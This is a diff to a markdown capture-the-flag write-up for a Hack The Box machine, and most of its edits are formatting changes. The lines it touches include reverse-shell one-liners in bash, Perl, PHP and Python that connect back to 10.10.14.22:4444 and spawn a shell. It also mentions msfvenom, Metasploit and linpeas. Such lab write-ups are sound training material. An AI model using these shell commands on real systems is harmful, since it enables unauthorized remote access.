@@ -20,9 +20,9 @@ output: html_document
 ![desc]({{https://jsom1.github.io/}}/_images/htb_sk_desc.png){: height="250px" width = "280px"}
 </div>
 
-**Ports/services exploited:** 5000/http
+**Ports/services exploited:** 5000/http\\
 **Tools:** Metasploit, linpeas\\
-**Techniques:** Enumeration\\
+**Techniques:** Enumeration, lateral movement\\
 **Keywords:** msfvenom vulnerability, APK file, reverse shell, linpeas\\
 
 
@@ -281,19 +281,22 @@ We see it started a listener and we're ready to catch a shell. We reupload the f
 As we did manually earlier with *python -c 'import pty;pty.spawn("/bin/bash");'*, we can use the command *shell* to make multi/handler automatically try to pop various shells. Sadly, it didn't work here either.
 So far both netcat and metasploit catch a shell back, but we can't do anything... We can probably use another payload to get a shell. Sometimes the target doesn't have netcat (even though our target should since it connected back to us). In this case, we can use other shells. There are several others such as:
 
-- Bash reverse shell:
+Bash reverse shell:
 ````
 bash -i>& /dev/tcp/10.10.14.22/4444 0>&1
 ````
-- Perl reverse shell: 
+
+Perl reverse shell: 
 ````
 perl -e ‘use Socket;$i=”10.10.14.22″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
 `````
-- PHP reverse shell (PHP is often present on web servers): 
+
+PHP reverse shell (PHP is often present on web servers): 
 `````
 php -r ‘$sock=fsockopen(“10.10.14.22”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
 `````
-- Python reverse shell:
+
+Python reverse shell:
 ````
 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.22”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
 ````
@@ -331,7 +334,7 @@ Finally we can run it with *./linpeas.sh*. Nothing is really standing out in the
 ![hackers file]({{https://jsom1.github.io/}}/_images/htb_sk_hackers.png)
 </div>
 
-The next step is probably to become *pwn* to get higher privileges (lateral movement). Let's have a look at that user's home directory. There's a script called *scanlosers.sh* which contains a reference to the *hackers* file located in kid's home:
+The next step is probably to become *pwn* (lateral movement). Let's have a look at that user's home directory. There's a script called *scanlosers.sh* which contains a reference to the *hackers* file located in kid's home:
 
 <div class="img_container">
 ![pwn directory]({{https://jsom1.github.io/}}/_images/htb_sk_pwn.png)
